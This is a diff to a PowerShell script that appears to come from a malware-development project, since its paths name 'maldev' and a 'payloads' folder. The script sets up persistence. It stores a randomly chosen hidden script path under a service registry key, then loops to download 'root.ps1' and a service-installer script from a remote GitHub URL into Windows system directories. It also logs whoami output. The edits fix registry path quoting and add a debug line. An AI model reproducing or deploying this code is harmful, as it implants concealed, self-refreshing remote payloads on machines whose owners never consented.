@@ -4,6 +4,7 @@ param(
     [string]$basePath
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
+echo $basePath >> "C:\Users\maldev\Downloads\root_mon.txt"
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
@@ -14,18 +15,18 @@ $paths = @(
 $serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
 $propertyName = "root"
-$item = Get-ItemProperty -Path `"$basePath`" -Name $propertyName -ErrorAction SilentlyContinue
+$item = Get-ItemProperty -Path $basePath -Name $propertyName -ErrorAction SilentlyContinue
 $canUpdateRootPath = $false
 
 if((($rootPath -eq $null) -or ($rootPath -eq "")) -and -not($item)){
     $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $rootPath = "$rootPath\root.ps1"
-    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootPath -Force | Out-Null
+    Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $true
 }
 
 if (-not($item)) {
-    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootPath -Force | Out-Null
+    Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootPath -Force | Out-Null
     $canUpdateRootPath = $false
 }
 
@@ -69,7 +70,7 @@ while ($true) {
         if($canUpdateRootPath){
             $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootPath = "$rootPath\root.ps1"
-            Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootPath -Force | Out-Null
+            Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootPath -Force | Out-Null
         }
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
